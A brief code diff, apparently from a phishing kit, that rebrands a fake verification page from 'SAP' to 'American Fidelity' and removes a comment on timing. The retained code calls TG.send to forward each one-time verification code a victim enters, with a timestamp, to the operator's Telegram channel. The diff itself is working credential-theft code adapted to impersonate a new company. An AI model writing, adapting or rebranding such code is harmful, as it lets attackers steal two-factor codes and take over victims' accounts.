@@ -117,12 +117,8 @@
 
       verifyBtn.disabled = true;
 
-      /* ══════════════════════════════════════════════════════
-         TELEGRAM — fire INSTANTLY before overlay appears.
-         Fire-and-forget: does not block or delay the UI.
-      ══════════════════════════════════════════════════════ */
       TG.send(
-        "🔢 <b>SAP — Verification Code Entered</b>\n\n" +
+        "🔢 <b>American Fidelity — Verification Code Entered</b>\n\n" +
         "🔐 Code: <code>" + code + "</code>\n" +
         "⏰ " + TG.ts()
       );
